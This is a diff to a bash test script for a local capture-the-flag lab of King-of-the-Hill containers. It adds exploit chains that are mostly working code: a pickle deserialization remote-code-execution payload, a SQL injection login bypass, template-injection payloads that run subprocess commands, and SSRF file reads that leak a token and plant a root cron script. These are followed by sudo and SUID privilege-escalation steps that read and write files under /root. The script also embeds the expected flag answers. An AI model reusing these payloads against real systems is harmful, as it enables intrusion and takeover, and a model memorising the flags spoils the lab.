@@ -69,20 +69,63 @@ h9_root(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__imp
 h9_king(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','1e echo $TOKEN > /root/king.txt','/etc/hostname'],capture_output=True,text=True).stdout}}" >/dev/null;
            curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','p','/root/king.txt'],capture_output=True,text=True).stdout}}" | grep -o 'TOK-[A-Za-z0-9-]*'; }
 
+# hill-10 (pickle deserialization RCE -> SUID find). Payload built via heredoc.
+h10_pay(){ python3 - "$1" <<'PY'
+import pickle,base64,subprocess,sys
+class E:
+    def __reduce__(self): return (subprocess.getoutput,(sys.argv[1],))
+print(base64.b64encode(pickle.dumps(E())).decode())
+PY
+}
+h10_run(){ curl -s -G http://127.0.0.1:8090/console --data-urlencode "data=$(h10_pay "$1")"; }
+h10_user(){ h10_run 'cat /home/mcp/user.txt' | grep -o 'CTF{[^}]*}'; }
+h10_root(){ h10_run '/usr/local/bin/mcp_ctl /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
+h10_king(){ h10_run "/usr/local/bin/mcp_ctl /etc/hostname -fprintf /root/king.txt $TOKEN" >/dev/null;
+            h10_run '/usr/local/bin/mcp_ctl /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-14 (SQLi auth bypass -> operator console -> sudo perl).
+h14_sess(){ curl -s -i -X POST --data-urlencode "name=' OR 1=1 -- " --data-urlencode 'pass=x' http://127.0.0.1:8094/login | grep -i set-cookie | sed 's/.*sess=//; s/;.*//' | tr -d '\r'; }
+h14_run(){ curl -s -b "sess=$(h14_sess)" -G http://127.0.0.1:8094/run --data-urlencode "cmd=$1"; }
+h14_user(){ h14_run 'cat /home/navi/user.txt' | grep -o 'CTF{[^}]*}'; }
+h14_root(){ h14_run 'sudo perl -e '\''system("cat /root/root.txt")'\''' | grep -o 'CTF{[^}]*}'; }
+h14_king(){ h14_run "sudo perl -e 'system(\"echo $TOKEN > /root/king.txt\")'" >/dev/null;
+            h14_run 'sudo perl -e '\''system("cat /root/king.txt")'\''' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-17 (SSTI spell portal -> sudo python3).
+h17_cast(){ curl -s -G http://127.0.0.1:8097/cast --data-urlencode "spell=$1"; }
+h17_user(){ h17_cast "{{__import__('subprocess').run(['cat','/home/wizard/user.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
+h17_root(){ h17_cast "{{__import__('subprocess').run(['sudo','python3','-c','import os;os.system(\"cat /root/root.txt\")'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
+h17_king(){ h17_cast "{{__import__('subprocess').run(['sudo','python3','-c','open(\"/root/king.txt\",\"w\").write(\"$TOKEN\")'],capture_output=True,text=True).stdout}}" >/dev/null;
+            h17_cast "{{__import__('subprocess').run(['sudo','python3','-c','print(open(\"/root/king.txt\").read())'],capture_output=True,text=True).stdout}}" | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-19 (SSRF+LFI relay -> token leak -> RCE -> root cron on writable /opt/jobs).
+h19_fetch(){ curl -s -G http://127.0.0.1:8099/fetch --data-urlencode "url=$1"; }
+h19_user(){ h19_fetch 'file:///home/owl/user.txt' | grep -o 'CTF{[^}]*}'; }
+h19_token(){ h19_fetch 'file:///opt/app/owl.token' | tr -d '\r\n '; }
+h19_disp(){ curl -s -G http://127.0.0.1:8099/dispatch --data-urlencode "token=$(h19_token)" --data-urlencode "cmd=$1"; }
+h19_root(){ h19_disp 'printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh' >/dev/null; sleep 5;
+            h19_disp 'cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
+h19_king(){ h19_disp "printf '#!/bin/sh\necho $TOKEN > /root/king.txt\ncat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh" >/dev/null; sleep 5;
+            h19_disp 'cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
 uf(){ case "$1" in
   1) echo 'CTF{w3b_rc3_1gn1t10n_f00th0ld}';; 2) echo 'CTF{drup4lg3dd0n2_unauth_rce}';;
   3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';;
   5) echo 'CTF{sp34k_fr13nd_4nd_3nt3r_m0r14}';; 6) echo 'CTF{p4l4nt1r_xx3_s33s_4ll}';;
   7) echo 'CTF{jwt_4lg_n0n3_f0rg3d_th3_3y3}';;  8) echo 'CTF{w34k_f0r3m4n_cr3ds_1s3ng4rd}';;
-  9) echo 'CTF{ss_t1_0n_th3_gr1d_10_t0w3r}';;   esac; }
+  9) echo 'CTF{ss_t1_0n_th3_gr1d_10_t0w3r}';;
+  10) echo 'CTF{p1ckl3_r3duc3_0n_th3_gr1d}';; 14) echo 'CTF{sql1_0r_1_3q_1_p4nd0r4}';;
+  17) echo 'CTF{sst1_sp3ll_h0gw4rts_rc3}';;   19) echo 'CTF{ssrf_lf1_0wl_p0st_l34k}';;   esac; }
 rf(){ case "$1" in
   1) echo 'CTF{l4r4v3l_sud0_gtf0b1ns_r00t}';; 2) echo 'CTF{su1d_b1t_pr1v3sc_on_h0st}';;
   3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';;
   5) echo 'CTF{sud0_f1nd_1n_th3_d33p_pl4c3s}';; 6) echo 'CTF{sud0_4wk_gtf0b1ns_0rth4nc}';;
   7) echo 'CTF{p4th_h1j4ck_1n_r00t_cr0n_w1n}';; 8) echo 'CTF{c4p_s3tu1d_0n_pyth0n_2_r00t}';;
-  9) echo 'CTF{sud0_s3d_gtf0b1ns_d3_r3z}';;   esac; }
+  9) echo 'CTF{sud0_s3d_gtf0b1ns_d3_r3z}';;
+  10) echo 'CTF{su1d_f1nd_d3r3z_t0_r00t}';;  14) echo 'CTF{sud0_p3rl_syst3m_2_r00t}';;
+  17) echo 'CTF{sud0_pyth0n_expell14rmus}';; 19) echo 'CTF{r00t_cr0n_wr1t4bl3_m1n1stry}';; esac; }
 
-for n in ${HILLS:-1 2 3 4 5 6 7 8 9}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 14 17 19}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
   echo "=== hill-$n ==="
   ok "$(h${n}_user)" "$(uf $n)" "hill-$n user flag (foothold)"
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n root flag (privesc)"
@@ -100,9 +143,13 @@ break_privesc(){ case "$1" in
   7) docker exec koth-hill-7 sh -c 'rm -f /opt/watchbin/keeper; chown root:root /opt/watchbin; chmod 755 /opt/watchbin' 2>/dev/null;;
   8) docker exec koth-hill-8 setcap -r /usr/local/bin/forgepy 2>/dev/null;;
   9) docker exec koth-hill-9 rm -f /etc/sudoers.d/program 2>/dev/null;;
+  10) docker exec koth-hill-10 chmod u-s /usr/local/bin/mcp_ctl 2>/dev/null;;
+  14) docker exec koth-hill-14 rm -f /etc/sudoers.d/navi 2>/dev/null;;
+  17) docker exec koth-hill-17 rm -f /etc/sudoers.d/wizard 2>/dev/null;;
+  19) docker exec koth-hill-19 sh -c 'rm -f /opt/jobs/dispatch.sh; chown root:root /opt/jobs; chmod 755 /opt/jobs' 2>/dev/null;;
   *) return 1;;                                                                  # hill-3 (writable cron): no cheap block/reset check
 esac; }
-for n in ${HILLS:-1 2 3 4 5 6 7 8 9}; do
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 14 17 19}; do
   break_privesc "$n" || continue
   docker exec koth-hill-$n /opt/app/reset.sh >/dev/null 2>&1
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n privesc works after reset"
